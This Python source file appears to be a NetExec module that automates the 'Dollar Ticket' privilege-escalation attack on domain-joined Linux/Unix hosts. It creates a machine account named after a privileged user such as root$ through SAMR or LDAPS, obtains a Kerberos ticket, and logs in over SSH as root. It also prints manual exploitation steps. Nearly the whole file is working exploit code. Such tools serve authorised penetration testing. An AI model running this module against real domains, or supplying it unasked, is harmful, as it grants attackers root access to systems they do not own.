#!/usr/bin/env python3
"""
Dollar Ticket Attack Module for NetExec
Automates privilege escalation on Linux/Unix domain-joined systems

Author: @bl4ckarch
Based on: https://wiki.samba.org/index.php/Security/Dollar_Ticket_Attack
CVEs: CVE-2020-25717, CVE-2020-25719, CVE-2021-42287
"""

import contextlib
import os
import subprocess
import sys
import tempfile

from impacket.dcerpc.v5 import samr, transport
from impacket.ldap.ldap import LDAPSessionError
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Exploits the Dollar Ticket Attack against Linux/Unix domain-joined targets

    Creates a machine account with a privileged username (e.g., root$), then optionally
    attempts to authenticate to the target via SSH using Kerberos GSSAPI. MIT Kerberos
    services strip the trailing '$' from machine accounts, allowing privilege escalation.
    """

    name = "dollar-ticket"
    description = "Exploits Dollar Ticket Attack for privilege escalation on Linux/Unix targets credits to @bl4ckarch"
    supported_protocols = ["smb", "ldap"]
    category = CATEGORY.PRIVILEGE_ESCALATION
    multiple_hosts = False

    def options(self, context, module_options):
        r"""
        Dollar Ticket Attack options:

        TARGET_USER     Local privileged user to impersonate (default: root)
        PASSWORD        Password for the machine account (default: random)
        METHOD          Creation method: SAMR or LDAPS (default: SAMR)
        SSH_TARGET      Target SSH host for automated exploitation (optional)

        Usage examples:
            # Create machine account and get exploitation steps
            nxc smb $DC_IP -u Username -p Password -M dollar-ticket -o TARGET_USER=root

            # With automated SSH exploitation
            nxc smb $DC_IP -u Username -p Password -M dollar-ticket \
                -o TARGET_USER=root SSH_TARGET=192.168.1.50

            # Use LDAPS method
            nxc ldap $DC_IP -u Username -p Password -M dollar-ticket \
                -o TARGET_USER=ubuntu METHOD=LDAPS SSH_TARGET=192.168.1.50

        Cleanup (when done):
            nxc smb $DC_IP -u Username -p Password -M add-computer \
                -o NAME=root DELETE=True
        """
        self.target_user = module_options.get("TARGET_USER", "root")
        self.password = module_options.get("PASSWORD", self._generate_password())
        self.method = module_options.get("METHOD", "SAMR").upper()
        self.ssh_target = module_options.get("SSH_TARGET", None)

        # Machine account name (without trailing $, added automatically)
        self.computer_name = self.target_user
        if self.computer_name.endswith("$"):
            self.computer_name = self.computer_name[:-1]

        self.computer_name_full = f"{self.computer_name}$"

        if self.method not in ["SAMR", "LDAPS"]:
            context.log.error("METHOD must be either SAMR or LDAPS")
            sys.exit(1)

    def on_login(self, context, connection):
        """Main execution flow"""
        self.context = context
        self.connection = connection

        context.log.info(f"Starting Dollar Ticket Attack targeting local user '{self.target_user}'")
        context.log.info(f"Machine account to create: {self.computer_name_full}")

        # Step 1: Create machine account
        success = self._create_machine_account()
        if not success:
            return

        # Step 2: Attempt SSH exploitation if target specified
        if self.ssh_target:
            self._exploit_via_ssh()
        else:
            self._provide_manual_steps()

    def _create_machine_account(self):
        """Create machine account via SAMR or LDAPS"""
        self.context.log.info(f"Creating machine account via {self.method}...")

        if self.method == "SAMR" and self.connection.args.protocol == "smb":
            return self._create_via_samr()
        elif self.method == "LDAPS" and self.connection.args.protocol == "ldap":
            return self._create_via_ldap()
        else:
            self.context.log.error(f"Cannot use {self.method} with {self.connection.args.protocol} protocol")
            self.context.log.error("Use: SAMR with SMB, or LDAPS with LDAP")
            return False

    def _create_via_samr(self):
        """Create machine account via SAMR (SMB)"""
        try:
            conn = self.connection
            rpc_transport = transport.SMBTransport(
                conn.conn.getRemoteHost(),
                445,
                r"\samr",
                smb_connection=conn.conn
            )

            dce = rpc_transport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # Open domain
            serv_handle = samr.hSamrConnect5(
                dce,
                f"\\\\{conn.conn.getRemoteName()}\x00",
                samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN
            )["ServerHandle"]

            domains = samr.hSamrEnumerateDomainsInSamServer(dce, serv_handle)["Buffer"]["Buffer"]
            non_builtin = [d for d in domains if d["Name"].lower() != "builtin"]

            if len(non_builtin) > 1:
                matched = [d for d in domains if d["Name"].lower() == self.connection.domain.lower()]
                selected = matched[0]["Name"] if matched else non_builtin[0]["Name"]
            else:
                selected = non_builtin[0]["Name"]

            domain_sid = samr.hSamrLookupDomainInSamServer(dce, serv_handle, selected)["DomainId"]
            domain_handle = samr.hSamrOpenDomain(
                dce,
                serv_handle,
                samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER,
                domain_sid
            )["DomainHandle"]

            # Create computer account
            try:
                request = samr.SamrCreateUser2InDomain()
                request["DomainHandle"] = domain_handle
                request["Name"] = self.computer_name_full
                request["AccountType"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                request["DesiredAccess"] = samr.USER_FORCE_PASSWORD_CHANGE
                user_handle = dce.request(request)["UserHandle"]

                # Set password
                samr.hSamrSetPasswordInternal4New(dce, user_handle, self.password)

                # Set workstation trust account flag
                user_rid = samr.hSamrLookupNamesInDomain(dce, domain_handle, [self.computer_name_full])["RelativeIds"]["Element"][0]
                samr.hSamrCloseHandle(dce, user_handle)
                user_handle = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)["UserHandle"]

                req = samr.SAMPR_USER_INFO_BUFFER()
                req["tag"] = samr.USER_INFORMATION_CLASS.UserControlInformation
                req["Control"]["UserAccountControl"] = samr.USER_WORKSTATION_TRUST_ACCOUNT
                samr.hSamrSetInformationUser2(dce, user_handle, req)

                samr.hSamrCloseHandle(dce, user_handle)
                samr.hSamrCloseHandle(dce, domain_handle)
                samr.hSamrCloseHandle(dce, serv_handle)

                self.context.log.success(f"Created machine account: {self.computer_name_full}")
                self.context.log.success(f"Password: {self.password}")
                return True

            except samr.DCERPCSessionError as e:
                if "STATUS_USER_EXISTS" in str(e):
                    self.context.log.error(f"Machine account '{self.computer_name_full}' already exists")
                elif "STATUS_ACCESS_DENIED" in str(e):
                    self.context.log.error("Access denied. Insufficient privileges.")
                elif "STATUS_DS_MACHINE_ACCOUNT_QUOTA_EXCEEDED" in str(e):
                    self.context.log.error("Machine account quota exceeded (MachineAccountQuota)")
                else:
                    self.context.log.error(f"Error creating machine account: {e}")
                return False

        except Exception as e:
            self.context.log.error(f"SAMR operation failed: {e}")
            return False
        finally:
            with contextlib.suppress(Exception):
                dce.disconnect()

    def _create_via_ldap(self):
        """Create machine account via LDAPS"""
        try:
            ldap_conn = self.connection.ldap_connection
            name = self.computer_name
            computer_dn = f"CN={name},CN=Computers,{self.connection.baseDN}"
            fqdn = f"{name}.{self.connection.domain}"

            spns = [
                f"HOST/{name}",
                f"HOST/{fqdn}",
                f"RestrictedKrbHost/{name}",
                f"RestrictedKrbHost/{fqdn}",
            ]

            ldap_conn.add(
                computer_dn,
                ["top", "person", "organizationalPerson", "user", "computer"],
                {
                    "dnsHostName": fqdn,
                    "userAccountControl": 0x1000,  # WORKSTATION_TRUST_ACCOUNT
                    "servicePrincipalName": spns,
                    "sAMAccountName": self.computer_name_full,
                    "unicodePwd": f'"{self.password}"'.encode("utf-16-le"),
                },
            )

            self.context.log.success(f"Created machine account: {self.computer_name_full}")
            self.context.log.success(f"Password: {self.password}")
            return True

        except LDAPSessionError as e:
            if "entryAlreadyExists" in str(e):
                self.context.log.error(f"Machine account '{self.computer_name_full}' already exists")
            elif "insufficientAccessRights" in str(e):
                self.context.log.error("Insufficient rights to create machine account")
            elif "constraintViolation" in str(e):
                self.context.log.error("Constraint violation (quota exceeded or password policy)")
            else:
                self.context.log.error(f"LDAP error: {e}")
            return False

    def _exploit_via_ssh(self):
        """Automated exploitation via SSH with Kerberos"""
        self.context.log.info(f"Attempting Kerberos authentication to {self.ssh_target}...")

        # Check if kinit/klist are available
        if not self._check_kerberos_tools():
            self.context.log.error("Kerberos tools (kinit/klist) not found. Install krb5-user package.")
            self._provide_manual_steps()
            return

        try:
            # Obtain TGT for the machine account principal (without $)
            # KDC will find root$ when root is requested
            self.context.log.info(f"Requesting TGT for principal '{self.target_user}'...")

            # Create temporary krb5.conf with the domain
            krb5_conf = self._create_krb5_conf()

            env = os.environ.copy()
            env["KRB5_CONFIG"] = krb5_conf

            # Use echo to pipe password to kinit
            kinit_cmd = f"echo '{self.password}' | kinit {self.target_user}@{self.connection.domain.upper()}"
            result = subprocess.run(
                kinit_cmd,
                shell=True,
                env=env,
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode != 0:
                self.context.log.error(f"kinit failed: {result.stderr}")
                self._provide_manual_steps()
                return

            self.context.log.success("TGT obtained successfully")

            # Verify ticket
            klist_result = subprocess.run(
                ["klist"],
                env=env,
                capture_output=True,
                text=True
            )

            if self.target_user in klist_result.stdout or self.computer_name_full in klist_result.stdout:
                self.context.log.info("Ticket cache contents:")
                for line in klist_result.stdout.split("\n")[:5]:
                    if line.strip():
                        self.context.log.info(f"  {line}")

            # Attempt SSH with GSSAPI
            self.context.log.info(f"Attempting SSH to {self.ssh_target} as '{self.target_user}'...")

            ssh_cmd = [
                "ssh",
                "-o", "PreferredAuthentications=gssapi-with-mic",
                "-o", "GSSAPIAuthentication=yes",
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                "-l", self.target_user,
                self.ssh_target,
                "id"
            ]

            ssh_result = subprocess.run(
                ssh_cmd,
                env=env,
                capture_output=True,
                text=True,
                timeout=15
            )

            if ssh_result.returncode == 0:
                self.context.log.success("PRIVILEGE ESCALATION SUCCESSFUL!")
                self.context.log.success(f"Authenticated as '{self.target_user}' on {self.ssh_target}")
                self.context.log.success(f"Output: {ssh_result.stdout.strip()}")
                self.context.log.info("")
                self.context.log.info("Cleanup (when done):")
                self.context.log.info(f"  nxc smb {self.connection.host} -u {self.connection.username} -p <password> \\")
                self.context.log.info(f"      -M add-computer -o NAME={self.computer_name} DELETE=True")
            else:
                self.context.log.error(f"SSH authentication failed: {ssh_result.stderr}")
                self.context.log.error("Possible reasons:")
                self.context.log.error("  - PAC validation is enabled on target")
                self.context.log.error("  - PermitRootLogin is disabled")
                self.context.log.error("  - GSSAPI authentication is disabled")
                self._provide_manual_steps()

            # Cleanup Kerberos ticket
            subprocess.run(["kdestroy"], env=env, capture_output=True)

            # Remove temporary krb5.conf
            with contextlib.suppress(Exception):
                os.unlink(krb5_conf)

        except subprocess.TimeoutExpired:
            self.context.log.error("Operation timed out")
            self._provide_manual_steps()
        except Exception as e:
            self.context.log.error(f"Exploitation failed: {e}")
            self._provide_manual_steps()

    def _provide_manual_steps(self):
        """Provide manual exploitation steps"""
        self.context.log.info("\n" + "=" * 70)
        self.context.log.info("EXPLOITATION STEPS")
        self.context.log.info("=" * 70)
        self.context.log.info(f"Machine account created: {self.computer_name_full}")
        self.context.log.info(f"Password: {self.password}")
        self.context.log.info(f"Domain: {self.connection.domain.upper()}")
        self.context.log.info("")
        self.context.log.info("1. Obtain Kerberos ticket:")
        self.context.log.info(f"   kinit {self.target_user}@{self.connection.domain.upper()}")
        self.context.log.info(f"   # Password: {self.password}")
        self.context.log.info("")
        self.context.log.info("2. Authenticate to target Linux/Unix host:")
        if self.ssh_target:
            self.context.log.info(f"   ssh -o PreferredAuthentications=gssapi-with-mic -l {self.target_user} {self.ssh_target}")
        else:
            self.context.log.info(f"   ssh -o PreferredAuthentications=gssapi-with-mic -l {self.target_user} <target_ip>")
        self.context.log.info("")
        self.context.log.info("3. Verify privilege escalation:")
        self.context.log.info("   id")
        self.context.log.info("   whoami")
        self.context.log.info("")
        self.context.log.info(f"Note: KDC issues ticket for '{self.computer_name_full}' when '{self.target_user}' is requested")
        self.context.log.info(f"      MIT Kerberos on target maps '{self.computer_name_full}' -> '{self.target_user}'")
        self.context.log.info("")
        self.context.log.info("CLEANUP (when done):")
        self.context.log.info(f"  nxc smb {self.connection.host} -u {self.connection.username} -p <password> \\")
        self.context.log.info(f"      -M add-computer -o NAME={self.computer_name} DELETE=True")
        self.context.log.info("=" * 70 + "\n")

    def _check_kerberos_tools(self):
        """Check if kinit and klist are available"""
        try:
            subprocess.run(["kinit", "--version"], capture_output=True, timeout=5)
            subprocess.run(["klist", "--version"], capture_output=True, timeout=5)
            return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def _create_krb5_conf(self):
        """Create temporary krb5.conf for the domain"""
        krb5_content = f"""[libdefaults]
    default_realm = {self.connection.domain.upper()}
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    {self.connection.domain.upper()} = {{
        kdc = {self.connection.host}
        admin_server = {self.connection.host}
    }}

[domain_realm]
    .{self.connection.domain.lower()} = {self.connection.domain.upper()}
    {self.connection.domain.lower()} = {self.connection.domain.upper()}
"""

        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".conf") as f:
            f.write(krb5_content)
            return f.name

    @staticmethod
    def _generate_password():
        """Generate a random complex password"""
        import random
        import string

        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        password = "".join(random.choice(chars) for _ in range(16))

        # Ensure complexity
        if not any(c.isupper() for c in password):
            password = password[0].upper() + password[1:]
        if not any(c.islower() for c in password):
            password = password[0].lower() + password[1:]
        if not any(c.isdigit() for c in password):
            password = password[:-1] + "1"
        if not any(c in "!@#$%^&*" for c in password):
            password = password[:-1] + "!"

        return password